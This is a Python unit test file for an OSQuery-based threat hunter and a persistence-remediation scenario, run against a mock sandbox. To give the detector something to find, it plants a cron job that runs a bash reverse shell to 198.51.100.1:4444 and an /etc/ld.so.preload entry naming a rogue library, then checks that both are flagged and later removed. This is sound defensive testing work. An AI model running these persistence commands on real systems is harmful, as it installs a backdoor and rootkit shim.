"""Unit tests for OSQuery Threat Hunting and Persistence Remediation."""

from __future__ import annotations

import pytest

from scenarios.threat_hunt_persistence import ThreatHuntPersistenceScenario
from security.threat_hunting import OSQueryThreatHunter
from tests.conftest import MockSandbox


@pytest.mark.asyncio
async def test_threat_hunter_detection() -> None:
    """Test OSQuery threat hunter detecting malicious cron and LD_PRELOAD shims."""
    sandbox = MockSandbox("threat-test-sb")
    hunter = OSQueryThreatHunter()

    # Baseline is clean
    report_clean = await hunter.run_full_threat_hunt(sandbox, target_name="test-sb")
    assert report_clean.clean is True
    assert len(report_clean.findings) == 0

    # Inject backdoor
    await sandbox.execute(
        "cat << 'EOF' > /etc/cron.d/backdoor_persist\n* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/198.51.100.1/4444 0>&1\"\nEOF"
    )
    await sandbox.execute('echo "/lib/x86_64-linux-gnu/libevil_shim.so" > /etc/ld.so.preload')

    report_infected = await hunter.run_full_threat_hunt(sandbox, target_name="test-sb")
    assert report_infected.clean is False
    assert report_infected.critical_high_count >= 2
    rule_names = [f.rule_name for f in report_infected.findings]
    assert "malicious_cron_persistence" in rule_names
    assert "ld_preload_userland_rootkit" in rule_names


@pytest.mark.asyncio
async def test_threat_hunt_persistence_scenario_lifecycle() -> None:
    """Test ThreatHuntPersistenceScenario fault injection and cleanup verification."""
    sandbox = MockSandbox("threat-scenario-sb")
    scenario = ThreatHuntPersistenceScenario()

    # 1. Setup
    assert await scenario.setup(sandbox) is True

    # 2. Inject fault
    assert await scenario.inject_fault(sandbox) is True

    # 3. Verify before fix -> Should Fail
    ok_pre, msg_pre = await scenario.verify(sandbox)
    assert ok_pre is False
    assert "unresolved" in msg_pre.lower() or "threat" in msg_pre.lower()

    # 4. Remediation: Purge persistence files
    await sandbox.execute("rm -f /etc/cron.d/backdoor_persist /etc/ld.so.preload")

    # 5. Verify after fix -> Should Pass
    ok_post, msg_post = await scenario.verify(sandbox)
    assert ok_post is True
    assert "purged" in msg_post.lower() or "success" in msg_post.lower()
